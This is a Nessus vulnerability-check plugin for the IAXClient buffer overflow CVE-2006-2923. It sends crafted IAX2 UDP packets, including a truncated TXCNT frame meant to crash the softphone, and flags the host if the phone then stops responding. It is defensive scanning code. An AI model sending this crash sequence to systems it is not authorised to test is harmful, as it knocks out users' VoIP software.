#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21684);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-2923");
  script_bugtraq_id(18307);
  script_osvdb_id(26176);

  script_name(english:"IAXClient Open Source Library iax_net_read Function Packet Handling Remote Overflow");
  script_summary(english:"Tries to crash IAXClient application");

 script_set_attribute(attribute:"synopsis", value:
"The remote softphone is prone to multiple buffer overflow attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using a VoIP software phone application
that is affected by multiple buffer overflows.  With specially crafted
UDP packets, an unauthenticated, remote attacker may be able to
leverage these issues to crash the affected application or to execute
arbitrary code on the remote host subject to the privileges of the
user running it." );
 script_set_attribute(attribute:"see_also", value:"http://www.coresecurity.com/common/showdoc.php?idx=548&idxseccion=10" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/436638/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Obtain to a version of the client application built using a version of
IAXClient from June 6 2006 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/06/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/06/06");
 script_cvs_date("$Date: 2014/08/15 21:51:08 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2006-2014 Tenable Network Security, Inc.");
  script_dependencies("iax2_detection.nasl");
  script_require_ports("Services/udp/iax2", 4569);

  exit(0);
}


include("byte_func.inc");

port = get_kb_item("Services/udp/iax2");
if (!port) port = 4569;
if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");

soc = open_sock_udp(port);


# Verify client responds to a POKE message.
poke = 
  mkword(0x8000) +                     # 'F' bit + source call number
  mkword(0) +                          # 'R' bit + dest call number
  mkdword(0) +                         # timestamp
  mkbyte(0) +                          # OSeqno
  mkbyte(0) +                          # ISeqno
  mkbyte(6) +                          # frametype, 6 => IAX frame
  mkbyte(0x1E);                        # 'C' bit + subclass, 0x1e => POKE request
send(socket:soc, data:poke);
res = recv(socket:soc, length:128);
if (
  strlen(res) != 12 ||
  ord(res[10]) != 6 ||
  (ord(res[11]) != 3 && ord(res[11]) != 4)
) exit(0);


# Send a packet in preparation of an exploit.
txcnt = 
  mkword(0x8000 | rand()) +
  mkword(0) +
  mkdword(rand()) +
  mkbyte(0) +
  mkbyte(0) +
  mkbyte(6) +
  mkbyte(0x17);
send(socket:soc, data:txcnt);
res = recv(socket:soc, length:128);


# Now exploit the flaw to crash the app.
txcnt = substr(txcnt, 0, strlen(txcnt)-2);
send(socket:soc, data:txcnt);
res = recv(socket:soc, length:128);


# Try to reconnect and send another POKE message to see if it's still up.
send(socket:soc, data:poke);
res = recv(socket:soc, length:128);
if (strlen(res) == 0) security_warning(port:port, protocol:"udp");
